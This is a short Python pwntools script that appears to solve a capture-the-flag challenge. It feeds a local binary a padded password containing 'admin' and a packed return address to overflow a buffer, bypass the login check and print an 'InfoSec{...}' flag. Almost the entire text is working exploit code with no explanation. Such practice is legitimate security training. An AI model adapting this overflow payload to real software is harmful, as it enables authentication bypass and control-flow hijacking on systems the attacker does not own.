#!/usr/bin/env python3
from pwn import *
import re
context.log_level = 'error'


flag_reg = re.compile("(InfoSec{.+[^}]})")

process_ = process("./main.elf")


address = int("0x401e35", 16)
address = struct.pack("l", address)

string_char = "c"
string_adm = "admin"
get_username = string_char.encode('utf-8') *15
get_password = string_char.encode('utf-8') * 14 + string_adm.encode('utf-8') + 25* string_char.encode('utf-8') + address



process_.sendline(get_username)
process_.sendline(get_password)


all_terminal = process_.recvall().decode('utf-8')



flag = flag_reg.findall(all_terminal)
flag = ''.join(flag) #list to string

print(flag)

